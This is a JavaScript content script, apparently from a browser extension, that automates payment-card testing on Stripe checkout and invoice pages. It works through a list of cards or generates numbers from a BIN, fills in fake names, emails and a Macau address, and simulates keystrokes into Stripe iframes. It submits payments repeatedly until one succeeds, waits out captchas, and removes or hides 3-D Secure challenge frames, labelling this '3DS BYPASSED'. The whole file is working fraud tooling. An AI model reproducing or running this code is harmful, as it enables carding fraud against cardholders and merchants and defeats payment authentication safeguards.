  function simulateSelectChange(element, value) {
    if (!element) return
    element.focus()
    element.value = value
    element.dispatchEvent(new Event("input", { bubbles: true }))
    element.dispatchEvent(new Event("change", { bubbles: true }))
    element.dispatchEvent(new CustomEvent("select:change", { bubbles: true, detail: { value } }))
    element.blur()
  }
  const realCardValues = {
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
  }
  async function autoFillForm() {
    let card, mm, yy, cvv
    if (currentMode === "cc") {
      const ccData = getNextCC()
      if (!ccData) {
        showWarning("❌ No more CCs in list", "error")
        stopAutoSubmit()
        return
      }
      card = ccData.number
      mm = ccData.month
      yy = ccData.year
      cvv = ccData.cvv
      const ccInfo = document.querySelector(".cc-info")
      if (ccInfo) ccInfo.textContent = `${currentCCIndex}/${ccList.length} used`
    } else {
      const bin = getSavedBIN()
      if (!bin) return
      const generated = generateCard(bin)
      if (!generated) return
      card = generated.card
      mm = generated.month
      yy = generated.year
      cvv = generated.cvv
    }
    window.generatedCard = card
    window.generatedCardFull = `${card}|${mm}|${yy}|${cvv}`
    realCardValues.cardNumber = card
    realCardValues.cardExpiry = mm + "/" + yy
    realCardValues.cardCvc = cvv
    showCardToast(card, mm, yy, cvv)
    const maskedCard = "0000000000000000"
    const maskedExpiry = "01/30"
    const maskedCvv = "000"

    const fieldMappings = [
      {
        selectors: [
          "#cardNumber", '[name="cardNumber"]', '[autocomplete="cc-number"]',
          '[data-elements-stable-field-name="cardNumber"]',
          'input[placeholder*="Card number"]',
          'input[placeholder*="card number"]',
          'input[aria-label*="Card number"]',
          '[class*="CardNumberInput"] input',
          '[class*="cardNumber"] input',
          'input[name="number"]',
          'input[id*="card-number"]',
          'input[name*="card_number"]',
          'input[placeholder*="0000"]',
          'input[placeholder*="1234"]'
        ],
        value: maskedCard,
        realValue: card,
      },
      {
        selectors: [
          "#cardExpiry", '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
          '[data-elements-stable-field-name="cardExpiry"]',
          'input[placeholder*="MM / YY"]',
          'input[placeholder*="MM/YY"]',
          'input[placeholder*="MM"]',
          'input[aria-label*="expir"]',
          '[class*="CardExpiry"] input',
          '[class*="expiry"] input',
          'input[name="expiry"]',
          'input[name="exp"]'
        ],
        value: maskedExpiry,
        realValue: mm + "/" + yy,
      },
      {
        selectors: [
          "#cardCvc", '[name="cardCvc"]', '[autocomplete="cc-csc"]',
          '[data-elements-stable-field-name="cardCvc"]',
          'input[placeholder*="CVC"]',
          'input[placeholder*="CVV"]',
          'input[aria-label*="CVC"]',
          'input[aria-label*="CVV"]',
          'input[aria-label*="security code"]',
          'input[aria-label*="Security code"]',
          '[class*="CardCvc"] input',
          '[class*="cvc"] input',
          'input[name="cvc"]',
          'input[name="cvv"]'
        ],
        value: maskedCvv,
        realValue: cvv
      },
      {
        selectors: [
          "#billingName", '[name="billingName"]', '[autocomplete="cc-name"]', '[autocomplete="name"]',
          'input[placeholder*="Name on card"]',
          'input[placeholder*="name on card"]',
          'input[aria-label*="Name"]',
          '[class*="billingName"] input',
          'input[name="name"]'
        ],
        value: customName || getRandomName(),
      },
      {
        selectors: [
          'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
          'input[id*="email"]', 'input[placeholder*="email"]', 'input[placeholder*="Email"]',
          '[class*="email"] input',
          'input[aria-label*="email"]'
        ],
        value: customEmail || getRandomEmail(),
      },
      {
        selectors: ["#billingAddressLine1", '[name="billingAddressLine1"]', '[autocomplete="address-line1"]'],
        value: getRandomStreet(),
      },
      {
        selectors: ["#billingLocality", '[name="billingLocality"]', '[autocomplete="address-level2"]'],
        value: "Macau",
      },
      {
        selectors: ["#billingPostalCode", '[name="billingPostalCode"]', '[autocomplete="postal-code"]'],
        value: "999078",
      },
    ]

    let filledCount = 0;
    for (const mapping of fieldMappings) {
      for (const selector of mapping.selectors) {
        const element = document.querySelector(selector)
        if (element) {
          simulateInput(element, mapping.value)
          if (mapping.realValue) {
            element.dataset.realValue = mapping.realValue
          }
          filledCount++;
          await new Promise((r) => setTimeout(r, 8))
          break
        }
      }
    }

    if (isInvoiceStripePage() || filledCount < 3) {
      await fillStripeElementsIframes(card, mm, yy, cvv);
    }

    const countrySelectors = ["#billingCountry", '[name="billingCountry"]', '[autocomplete="country"]']
    for (const selector of countrySelectors) {
      const element = document.querySelector(selector)
      if (element) {
        simulateSelectChange(element, "MO")
        break
      }
    }
    await new Promise((r) => setTimeout(r, 30))
  }

  async function fillStripeElementsIframes(card, mm, yy, cvv) {
    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    const iframes = document.querySelectorAll('iframe[name*="__privateStripeFrame"], iframe[title*="Secure"], iframe[src*="stripe"]');

    for (const iframe of iframes) {
      const name = iframe.name || '';
      const title = iframe.title || '';

      const isCardNumber = name.includes('cardNumber') || title.toLowerCase().includes('card number');
      const isExpiry = name.includes('cardExpiry') || title.toLowerCase().includes('expir');
      const isCvc = name.includes('cardCvc') || title.toLowerCase().includes('cvc') || title.toLowerCase().includes('security');

      try {
        const rect = iframe.getBoundingClientRect();
        if (rect.width > 0 && rect.height > 0) {
          const x = rect.left + rect.width / 2;
          const y = rect.top + rect.height / 2;

          const elementAtPoint = document.elementFromPoint(x, y);
          if (elementAtPoint) {
            elementAtPoint.click();
            await wait(20);
          }
        }
      } catch (e) {
      }
    }

    const stripeInputWrappers = document.querySelectorAll('[class*="StripeElement"], [class*="CardElement"], [class*="PaymentElement"]');
    for (const wrapper of stripeInputWrappers) {
      const rect = wrapper.getBoundingClientRect();
      if (rect.width > 0 && rect.height > 0) {
        wrapper.click();
        await wait(20);
      }
    }

    if (isInvoiceStripePage()) {
      await simulateStripeElementsInput(card, mm, yy, cvv);
    }
  }

  async function simulateStripeElementsInput(card, mm, yy, cvv) {
    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    async function typeText(text, delay = 50) {
      for (const char of text) {
        const keydownEvent = new KeyboardEvent('keydown', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        const keypressEvent = new KeyboardEvent('keypress', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        const inputEvent = new InputEvent('input', {
          data: char,
          inputType: 'insertText',
          bubbles: true,
          cancelable: true
        });

        const keyupEvent = new KeyboardEvent('keyup', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        document.activeElement?.dispatchEvent(keydownEvent);
        document.activeElement?.dispatchEvent(keypressEvent);
        document.activeElement?.dispatchEvent(inputEvent);
        document.activeElement?.dispatchEvent(keyupEvent);

        await wait(delay);
      }
    }

    async function pressTab() {
      const tabDown = new KeyboardEvent('keydown', { key: 'Tab', code: 'Tab', keyCode: 9, which: 9, bubbles: true });
      const tabUp = new KeyboardEvent('keyup', { key: 'Tab', code: 'Tab', keyCode: 9, which: 9, bubbles: true });
      document.activeElement?.dispatchEvent(tabDown);
      document.activeElement?.dispatchEvent(tabUp);
      await wait(140);
    }

    async function findAndClickField(selectors, fieldName) {
      for (const selector of selectors) {
        try {
          const elements = document.querySelectorAll(selector);
          for (const element of elements) {
            const rect = element.getBoundingClientRect();
            if (rect.width > 0 && rect.height > 0) {
              element.click();
              element.focus?.();
              await wait(140);
              return true;
            }
          }
        } catch (e) {}
      }
      return false;
    }

    const cardNumberSelectors = [
      '[class*="CardNumberElement"]',
      '[class*="cardNumber"]',
      '[data-field="number"]',
      'iframe[title*="card number" i]',
      'iframe[name*="cardNumber"]',
      'input[placeholder*="0000"]',
      'input[placeholder*="1234"]',
      'input[autocomplete="cc-number"]',
      '[class*="CardNumber"] input',
      '[class*="card-number"] input'
    ];

    let cardFieldFound = await findAndClickField(cardNumberSelectors, 'card number');

    if (!cardFieldFound) {
      const stripeElements = document.querySelectorAll('[class*="StripeElement"], [class*="CardElement"], [class*="PaymentElement"]');
      for (const el of stripeElements) {
        const rect = el.getBoundingClientRect();
        if (rect.width > 100 && rect.height > 20) {
          el.click();
          await wait(200);
          cardFieldFound = true;
          break;
        }
      }
    }

    if (!cardFieldFound) {
      const paymentSection = document.querySelector('[class*="payment"], [class*="Payment"], [class*="card"], [class*="Card"], form');
      if (paymentSection) {
        const firstInput = paymentSection.querySelector('input[type="text"], input:not([type]), [contenteditable]');
        if (firstInput) {
          firstInput.click();
          firstInput.focus?.();
          await wait(140);
          cardFieldFound = true;
        }
      }
    }

    if (cardFieldFound) {
      await typeText(card, 20);
      await wait(200);

      await pressTab();
      await typeText(mm + yy, 20);
      await wait(200);

      await pressTab();
      await typeText(cvv, 20);
      await wait(200);
    }

  }

  function isSubmitButtonAvailable() {
    const submitButton = document.querySelector(".SubmitButton-IconContainer")
    if (submitButton) {
      const button = submitButton.closest(".SubmitButton")
      if (button) {
        const computedStyle = window.getComputedStyle(button)
        if (!button.disabled &&
            !button.classList.contains("SubmitButton--incomplete") &&
            computedStyle.opacity !== "0" &&
            computedStyle.visibility !== "hidden" &&
            computedStyle.display !== "none") {
          return true;
        }
      }
    }

    if (isInvoiceStripePage()) {
      const payButtons = document.querySelectorAll('button');
      for (const btn of payButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if ((text === 'pay' || text.startsWith('pay ') || text.includes('pay $')) && !btn.disabled) {
          return true;
        }
      }
    }

    return false;
  }
  async function waitForSubmitButton(timeout = 10000) {
    const startTime = Date.now()
    return new Promise((resolve) => {
      const checkButton = () => {
        if (isSubmitButtonAvailable()) {
          resolve(true)
        } else if (!isAutoSubmitting || Date.now() - startTime > timeout) {
          resolve(false)
        } else {
          setTimeout(checkButton, 50)
        }
      }
      checkButton()
    })
  }
  async function handleAutoSubmit() {
    while (isAutoSubmitting && !hasHit) {
      if (hasHit) {
        break
      }

      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise((resolve) => setTimeout(resolve, 500))
        }
        if (!isAutoSubmitting || hasHit) break
        await new Promise((resolve) => setTimeout(resolve, 1000))
      }

      currentCardProcessed = false
      threedsBypassed = false
      cardAttemptStartTime = Date.now()
      await autoFillForm()
      if (hasHit) break
      const buttonReady = await waitForSubmitButton()
      if (!isAutoSubmitting || hasHit || !buttonReady) break
      const buttonContainer = document.querySelector(".SubmitButton-IconContainer")
      if (buttonContainer) {
        const button = buttonContainer.closest(".SubmitButton") || buttonContainer.closest("button")
        if (button) button.click()
      }

      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise((resolve) => setTimeout(resolve, 500))
        }
        if (!isAutoSubmitting || hasHit) break
        await new Promise((resolve) => setTimeout(resolve, 500))
      }

      await waitForResponse(15000)
      if (!isAutoSubmitting || hasHit) break
      await new Promise((resolve) => setTimeout(resolve, 500))
      await waitForSubmitButton()
    }
    if (hasHit) {
      stopAutoSubmit()
    }
  }

  let hasClickedCardTab = false;

  function clickCardPaymentTab() {
    if (hasClickedCardTab) return;

    try {
      function simulateRealClick(element) {
        if (!element) return false;

        if (element.tagName === 'INPUT') {
          const label = element.closest('label') || document.querySelector(`label[for="${element.id}"]`);
          if (label) {
            label.click();
            return true;
          }

          const clickableParent = element.closest('[role="radio"]') ||
                                  element.closest('[role="tab"]') ||
                                  element.closest('[class*="Tab"]') ||
                                  element.closest('[class*="Option"]') ||
                                  element.closest('[class*="Method"]') ||
                                  element.parentElement;
          if (clickableParent && clickableParent !== element) {
            clickableParent.click();
            return true;
          }

          element.checked = true;
          element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new Event('input', { bubbles: true }));
          element.dispatchEvent(new Event('change', { bubbles: true }));
          return true;
        }

        element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window }));
        element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true, view: window }));
        element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
        return true;
      }

      const allLabels = document.querySelectorAll('label, [role="radio"], [role="tab"], [class*="Tab"], [class*="Option"]');
      for (const el of allLabels) {
        const text = (el.textContent || el.innerText || '').trim();
        if (text === 'Card' || text.startsWith('Card ') || text.match(/^Card\s*$/i)) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            simulateRealClick(el);
            hasClickedCardTab = true;

            const innerInput = el.querySelector('input[type="radio"]');
            if (innerInput) {
              innerInput.checked = true;
              innerInput.dispatchEvent(new Event('change', { bubbles: true }));
            }
            return true;
          }
        }
      }

      const cardInput = document.querySelector('input[value="card"], input[name*="payment"][value="card"]');
      if (cardInput) {

        const container = cardInput.closest('label') ||
                         cardInput.closest('[role="radio"]') ||
                         cardInput.closest('[role="tab"]') ||
                         cardInput.closest('[class*="Tab"]') ||
                         cardInput.closest('[class*="Option"]') ||
                         cardInput.closest('[class*="Method"]') ||
                         cardInput.closest('div[class]');

        if (container && container !== cardInput) {
          simulateRealClick(container);
        }

        cardInput.checked = true;
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));
        cardInput.dispatchEvent(new Event('input', { bubbles: true }));

        hasClickedCardTab = true;
        return true;
      }

      const cardTabSelectors = [
        '[data-testid="card-tab"]',
        '[data-testid="CARD-tab"]',
        '[data-testid*="card" i]',
        'button[data-value="card"]',
        '[role="tab"][data-value="card"]',
        '[class*="PaymentMethodSelector"] [class*="Tab"]:first-child',
        '[class*="PaymentMethod"] button:first-child',
        '[class*="Tab"][class*="card" i]',
        '.p-TabList button:first-child',
        '[role="tablist"] button:first-child',
        '[role="radiogroup"] > div:first-child',
        '[aria-label*="Card" i]',
      ];

      for (const selector of cardTabSelectors) {
        try {
          const element = document.querySelector(selector);
          if (element) {
            const rect = element.getBoundingClientRect();
            if (rect.width > 0 && rect.height > 0) {
              simulateRealClick(element);
              hasClickedCardTab = true;
              return true;
            }
          }
        } catch (e) {}
      }

      const paymentArea = document.querySelector('[class*="PaymentMethod"], [class*="payment-method"], [role="radiogroup"]');
      if (paymentArea) {
        const firstRadio = paymentArea.querySelector('input[type="radio"], [role="radio"]');
        if (firstRadio) {
          const container = firstRadio.closest('label') || firstRadio.closest('div') || firstRadio;
          simulateRealClick(container);
          if (firstRadio.tagName === 'INPUT') {
            firstRadio.checked = true;
            firstRadio.dispatchEvent(new Event('change', { bubbles: true }));
          }
          hasClickedCardTab = true;
          return true;
        }
      }

      return false;
    } catch (e) {
      return false;
    }
  }

  function simulateRealTap(element) {
    if (!element) return false;

    const rect = element.getBoundingClientRect();
    const x = rect.left + rect.width / 2;
    const y = rect.top + rect.height / 2;

    const actualElement = document.elementFromPoint(x, y) || element;

    const eventOptions = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      button: 0,
      buttons: 1,
      detail: 1,
      composed: true
    };

    actualElement.dispatchEvent(new MouseEvent('mouseenter', { ...eventOptions, bubbles: false }));
    actualElement.dispatchEvent(new MouseEvent('mouseover', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('mousemove', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('mousedown', eventOptions));
    actualElement.focus?.();
    actualElement.dispatchEvent(new MouseEvent('mouseup', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('click', eventOptions));

    if (actualElement !== element) {
      element.dispatchEvent(new MouseEvent('click', eventOptions));
    }

    return true;
  }

  function forceClick(element) {
    if (!element) return false;

    const rect = element.getBoundingClientRect();
    const x = rect.left + rect.width / 2;
    const y = rect.top + rect.height / 2;

    const pointerOptions = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      pointerId: 1,
      pointerType: 'mouse',
      isPrimary: true,
      button: 0,
      buttons: 1,
      composed: true
    };

    element.dispatchEvent(new PointerEvent('pointerover', pointerOptions));
    element.dispatchEvent(new PointerEvent('pointerenter', { ...pointerOptions, bubbles: false }));
    element.dispatchEvent(new PointerEvent('pointerdown', pointerOptions));
    element.dispatchEvent(new PointerEvent('pointerup', pointerOptions));

    const clickEvent = new MouseEvent('click', {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      button: 0,
      detail: 1,
      composed: true
    });

    element.dispatchEvent(clickEvent);

    element.click?.();

    return true;
  }

  async function openCardDrawer() {
    if (hasClickedCardTab) return;

    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    const isDrawerOpen = () => {

      const allInputs = document.querySelectorAll('input');
      for (const input of allInputs) {
        const placeholder = (input.placeholder || '').toLowerCase();
        const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
        if (placeholder.includes('card number') || placeholder.includes('1234') ||
            ariaLabel.includes('card number') || ariaLabel.includes('credit card')) {
          const rect = input.getBoundingClientRect();
          if (rect.height > 10 && rect.width > 50) {
            return true;
          }
        }
      }

      const cardSections = document.querySelectorAll('[class*="CardField"], [class*="cardField"], [class*="CardNumberField"], [class*="card-number"]');
      for (const section of cardSections) {
        const rect = section.getBoundingClientRect();
        if (rect.height > 40 && rect.width > 100) {
          return true;
        }
      }

      const allLabels = document.querySelectorAll('label, span, div');
      for (const label of allLabels) {
        const text = (label.textContent || '').trim().toLowerCase();
        if (text === 'card number' || text === 'card information') {
          const rect = label.getBoundingClientRect();
          if (rect.height > 0 && rect.width > 0) {
            const parent = label.closest('div');
            if (parent) {
              const nearbyInput = parent.querySelector('input, iframe');
              if (nearbyInput) {
                const inputRect = nearbyInput.getBoundingClientRect();
                if (inputRect.height > 10) {
                  return true;
                }
              }
            }
          }
        }
      }

      const cardInput = document.querySelector('input[value="card"]');
      if (cardInput) {
        let container = cardInput.closest('[class*="Option"]') || cardInput.closest('[class*="AccordionItem"]') || cardInput.closest('[role="radio"]')?.parentElement;
        if (container) {
          const rect = container.getBoundingClientRect();
          if (rect.height > 150) {
            return true;
          }
        }
      }

      for (const input of allInputs) {
        const placeholder = (input.placeholder || '').toLowerCase();
        if (placeholder.includes('mm') || placeholder.includes('yy') || placeholder.includes('cvc') || placeholder.includes('cvv')) {
          const rect = input.getBoundingClientRect();
          if (rect.height > 0) {
            return true;
          }
        }
      }

      return false;
    };

    const cardInput = document.querySelector('input[value="card"]');

    if (!cardInput) {
      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }
      hasClickedCardTab = true;
      return false;
    }

    if (cardInput.checked) {
      await wait(80);
      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }
    }

    const getClickTargets = () => {
      const targets = [];

      const accordionTitle = document.querySelector('[class*="AccordionItemCover-title"]:not([class*="Container"])');
      const accordionTitleContainer = document.querySelector('[class*="AccordionItemCover-titleContai"]');

      const allAccordionTitles = document.querySelectorAll('[class*="AccordionItem"] [class*="title"], [class*="Accordion"] [class*="Title"]');
      for (const title of allAccordionTitles) {
        const text = (title.textContent || '').toLowerCase();
        if (text.includes('card') && !text.includes('gift')) {
          targets.push(title);
        }
      }

      const accordionItem = cardInput.closest('[class*="AccordionItem"]');
      if (accordionItem) {
        const header = accordionItem.querySelector('[class*="Cover"], [class*="Header"], [class*="Title"]');
        if (header) targets.push(header);
        targets.push(accordionItem);
      }

      let parent = cardInput.parentElement;
      for (let i = 0; i < 5 && parent; i++) {
        if (parent.tagName !== 'BODY' && parent.tagName !== 'HTML') {
          if (!targets.includes(parent)) {
            targets.push(parent);
          }
        }
        parent = parent.parentElement;
      }

      const label = cardInput.closest('label');
      const radio = cardInput.closest('[role="radio"]');
      const option = cardInput.closest('[class*="Option"]');

      if (label && !targets.includes(label)) targets.unshift(label);
      if (radio && !targets.includes(radio)) targets.unshift(radio);
      if (option && !targets.includes(option)) targets.unshift(option);

      return targets.filter(t => {
        const r = t.getBoundingClientRect();
        return r.width > 0 && r.height > 0;
      });
    };

    const targets = getClickTargets();

    for (let attempt = 1; attempt <= 3; attempt++) {

      for (let i = 0; i < targets.length; i++) {
        const target = targets[i];
        const tagInfo = `${target.tagName}${target.className ? '.' + String(target.className).split(' ')[0].substring(0, 30) : ''}`;

        forceClick(target);
        await wait(60);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        simulateRealTap(target);
        await wait(60);

        cardInput.checked = true;
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));

        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        target.click();
        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        target.scrollIntoView({ behavior: 'instant', block: 'center' });
        await wait(40);
        simulateRealTap(target);
        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }
      }

      cardInput.scrollIntoView({ behavior: 'instant', block: 'center' });
      await wait(40);

      simulateRealTap(cardInput);

      try {
        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'checked').set;
        nativeInputValueSetter.call(cardInput, true);
        cardInput.dispatchEvent(new Event('input', { bubbles: true }));
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));
      } catch (e) {}

      await wait(200);

      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }

      await wait(60);
    }

    hasClickedCardTab = true;
    return false;
  }

  let hasClickedInvoiceCardSection = false;

  async function handleInvoiceAutomation() {
  if (!isInvoiceStripePage()) return;

  const wait = (ms) => new Promise(r => setTimeout(r, ms));

  await wait(300);

    if (!hasClickedInvoiceCardSection) {
      const cardSectionSelectors = [
        '[class*="Card"][class*="Section"]',
        '[class*="PaymentMethod"] [class*="Card"]',
        'button:has-text("Card")',
        'div[role="button"]:has-text("Card")',
        '[class*="Accordion"] [class*="title"]',
        '[class*="payment"] [class*="option"]'
      ];

      const allClickables = document.querySelectorAll('button, [role="button"], [class*="Section"], [class*="Option"], [class*="Method"], label');
      for (const el of allClickables) {
        const text = (el.textContent || '').trim();
        if (text === 'Card' || /^Card$/i.test(text) || (text.includes('Card') && text.length < 20)) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            forceClick(el);
            hasClickedInvoiceCardSection = true;
            await wait(150);
            break;
          }
        }
      }
    }

    const findPayButton = () => {
      const payButtonSelectors = [
        'button[class*="Pay"]',
        'button[type="submit"]',
        '[class*="SubmitButton"]',
        '[class*="PayButton"]',
        'button[data-testid*="pay"]',
        'button[data-testid*="submit"]'
      ];

      for (const selector of payButtonSelectors) {
        const btn = document.querySelector(selector);
        if (btn) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }

      const allButtons = document.querySelectorAll('button');
      for (const btn of allButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if (text === 'pay' || text.startsWith('pay ') || text.includes('pay $') || text.includes('pay ₹')) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }

      return null;
    };

    window.invoicePayButton = findPayButton();
    if (window.invoicePayButton) {
    }

    return true;
  }

  async function clickInvoicePayButton() {
    const payBtn = window.invoicePayButton || (() => {
      const allButtons = document.querySelectorAll('button');
      for (const btn of allButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if (text === 'pay' || text.startsWith('pay ') || text.includes('pay $') || text.includes('pay ₹')) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }
      return null;
    })();

    if (payBtn) {
      forceClick(payBtn);
      return true;
    }

    return false;
  }

  function startAutoSubmit() {
    if (isAutoSubmitting) return
    isAutoSubmitting = true
    successStartTime = Date.now()

    if (isInvoiceStripePage()) {
      handleInvoiceAutomation().then(() => {
        handleAutoSubmit()
      });
    } else {
      openCardDrawer().then(() => {
        handleAutoSubmit()
      });
    }

    const autocoBtn = document.getElementById("autocoBtn")
    if (autocoBtn) {
      autocoBtn.textContent = "■ Stop"
      autocoBtn.classList.add("active")
    }
  }
  function stopAutoSubmit() {
    isAutoSubmitting = false
    const autocoBtn = document.getElementById("autocoBtn")
    if (autocoBtn) {
      autocoBtn.textContent = "▶ Start"
      autocoBtn.classList.remove("active")
    }
  }
  const processedResponses = new Set()
  let responseCounter = 0
  let currentCardProcessed = false
  let lastProcessedCard = ""
  let responseReceived = false
  let responseResolve = null
  let threedsBypassed = false
  function waitForResponse(timeout = 15000) {
    return new Promise((resolve) => {
      responseReceived = false
      responseResolve = resolve
      setTimeout(() => {
        if (!responseReceived) {
          responseReceived = true
          if (responseResolve) responseResolve()
        }
      }, timeout)
    })
  }
  function signalResponseReceived() {
    responseReceived = true
    if (responseResolve) {
      responseResolve()
      responseResolve = null
    }
  }
  function detect3DS(obj, depth = 0) {
    if (depth > 10 || !obj || typeof obj !== "object") return false
    if (obj.status === "requires_action" || obj.status === "requires_source_action") return true
    if (obj.next_action && typeof obj.next_action === "object") {
      const naType = obj.next_action.type
      if (naType === "use_stripe_sdk" || naType === "redirect_to_url" || naType === "three_d_secure_redirect") return true
    }
    if (obj.payment_intent?.status === "requires_action") return true
    if (obj.paymentIntent?.status === "requires_action") return true
    if (obj.source?.status === "pending" && obj.source?.flow === "redirect") return true
    for (const key of Object.keys(obj)) {
      if (typeof obj[key] === "object" && obj[key] !== null) {
        if (detect3DS(obj[key], depth + 1)) return true
      }
    }
    return false
  }
  function show3DSBypassed() {
    const header = document.querySelector(".panel-header")
    if (!header) return
    let badge = header.querySelector(".threeds-badge")
    if (badge) {
      badge.remove()
    }
    badge = document.createElement("span")
    badge.className = "threeds-badge"
    badge.textContent = "3DS BYPASSED"
    const title = header.querySelector(".panel-title")
    if (title) {
      title.insertAdjacentElement("afterend", badge)
    } else {
      header.prepend(badge)
    }
    setTimeout(() => {
      if (badge.parentNode) {
        badge.classList.add("threeds-badge-fadeout")
        setTimeout(() => badge.remove(), 500)
      }
    }, 4000)
  }
  const threeDSSelectors = [
    'iframe[src*="three-ds"]', 'iframe[src*="3ds"]', 'iframe[src*="3d-secure"]',
    'iframe[name*="__stripeJSChallengeFrame"]', 'iframe[name*="__stripeJSAuth"]',
    'iframe[src*="authenticate"]', 'iframe[src*="stripe.com/3d"]',
    'iframe[id*="challengeFrame"]', 'iframe[name*="challengeFrame"]',
    'iframe[src*="verifycard"]', 'iframe[src*="threedsmethod"]',
    'iframe[src*="creq"]', 'iframe[src*="areq"]',
    'iframe[src*="safekey"]', 'iframe[src*="securecode"]',
    'iframe[src*="3dsecure"]', 'iframe[src*="acs"]',
    'iframe[src*="cardinal"]', 'iframe[src*="centinelapi"]',
    'div[class*="StripeChallenge"]', 'div[class*="three-ds"]',
    'div[class*="3ds"]', 'div[id*="3ds"]',
    'div[class*="challenge-container"]', 'div[class*="authentication-modal"]',
    'div[class*="threeds"]', 'div[id*="threeds"]'
  ]
  function nuke3DSElement(el) {
    try {
      el.remove()
    } catch (e) {
      try {
        el.style.display = "none"
        el.style.visibility = "hidden"
        el.style.width = "0"
        el.style.height = "0"
        el.style.position = "fixed"
        el.style.top = "-9999px"
        el.style.left = "-9999px"
        el.style.opacity = "0"
        el.style.pointerEvents = "none"
        el.src = "about:blank"
      } catch (e2) {}
    }
  }
  function is3DSElement(node) {
    if (!node || node.nodeType !== 1) return false
    const tagName = (node.tagName || "").toLowerCase()
    const src = (node.getAttribute("src") || "").toLowerCase()
    const name = (node.getAttribute("name") || "").toLowerCase()
    const cls = (node.className || "").toLowerCase()
    const id = (node.id || "").toLowerCase()
    if (tagName === "iframe") {
      if (
        src.includes("three-ds") || src.includes("3ds") || src.includes("3d-secure") ||
        src.includes("3dsecure") || src.includes("authenticate") ||
        src.includes("threedsmethod") || src.includes("creq") || src.includes("areq") ||
        src.includes("verifycard") || src.includes("safekey") || src.includes("securecode") ||
        src.includes("cardinal") || src.includes("centinelapi") || src.includes("acs") ||
        name.includes("challengeframe") || name.includes("__stripejschallengeframe") ||
        name.includes("__stripejsauth") || name.includes("threeds") ||
        name.includes("3ds") || name.includes("stepupframe")
      ) return true
    }
    if (
      cls.includes("stripechallenge") || cls.includes("3ds") || cls.includes("three-ds") ||
      cls.includes("threeds") || cls.includes("challenge-container") ||
      cls.includes("authentication-modal") || cls.includes("authentication-overlay") ||
      id.includes("3ds") || id.includes("threeds") || id.includes("challenge")
    ) return true
    return false
  }
  function hide3DSElements() {
    for (const selector of threeDSSelectors) {
      try {
        const els = document.querySelectorAll(selector)
        for (const el of els) nuke3DSElement(el)
      } catch (e) {}
    }
    try {
      const allIframes = document.querySelectorAll("iframe")
      for (const iframe of allIframes) {
        const src = (iframe.src || "").toLowerCase()
        const name = (iframe.name || "").toLowerCase()
        const rect = iframe.getBoundingClientRect()
        if (rect.width > 200 && rect.height > 200) {
          if (
            src.includes("stripe") && (src.includes("auth") || src.includes("challenge") || src.includes("3d")) ||
            name.includes("challenge") || name.includes("auth") || name.includes("3d")
          ) {
            nuke3DSElement(iframe)
          }
        }
      }
    } catch (e) {}
    try {
      const fullScreenDivs = document.querySelectorAll('div[style*="z-index"]')
      for (const div of fullScreenDivs) {
        const rect = div.getBoundingClientRect()
        const style = window.getComputedStyle(div)
        const zIndex = parseInt(style.zIndex) || 0
